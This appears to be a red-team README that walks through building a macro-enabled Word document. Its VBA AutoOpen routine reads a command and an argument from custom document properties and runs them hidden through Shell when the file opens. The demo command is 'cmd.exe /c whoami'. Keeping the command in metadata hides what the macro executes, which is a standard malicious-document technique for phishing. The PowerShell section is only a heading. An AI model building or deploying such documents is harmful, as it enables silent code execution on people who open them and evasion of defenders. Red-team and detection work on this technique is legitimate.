# Office_Macros_With_Hidden_Functionalities
## Summary
Inspired by the recent Offensive Security post https://www.offensive-security.com/offsec/macro-weaponization/ I thought it would be beneficial to make some minor modifications to this so that it could be updated from the command line using PowerShell #ClickingStuffIsHard #TheGUIWasAMistake. 

## Create Document Template
1. Create a new word document. 
![Create New Document](images/1.png)

2. Select `View`, `Macros`, `View Macros`.
![View Macros](images/2.png)

3. Enter a name for the macro in the `Macro name:` field and select `Create`. Ensure that the `Macros in:` field is set to be the current document (Document1) likely if the document is new and hasn't yet been saved. 
![Create Macro](images/3.png)

4. If prompted to save the document somewhere, In this example I will use the location `C:\temp\cmd_exec.docx`. Also set the `Save as type:` field to be `Word Macro-Enabled Document (*.docm)`. 
![Create Macro](images/10.png)

5. Copy & Paste the code below into the codebox and click on the `Save` icon.
![Create Macro](images/4.png)
```vb
Sub AutoOpen()
    chapel
End Sub
Sub chapel()
    Dim strProgramName As String
    Dim strArgument As String
    Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties("cmd").Value
    strArgument = doc.BuiltInDocumentProperties("argument").Value
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub

```
6. Create Custom properties. Go to `File`, `Info`, `Properties`, `Advanced Properties`.
![Create Macro](images/5.png)

7. In the `name` field enter `cmd`, in the `value` field enter `cmd.exe` then click `Add`
![Create Macro](images/6.png)
![Create Macro](images/7.png)

8. In the `name` field enter `argument`, in the `value` field enter `/c whoami` then click `Add`
![Create Macro](images/8.png)

9. Once both values have been added, Click OK to close the `Properties` dialog box. 
![Create Macro](images/9.png)

9. Save the document, for this example I have saved it to `C:\temp\cmd_exec.docx`. 

## PowerShell
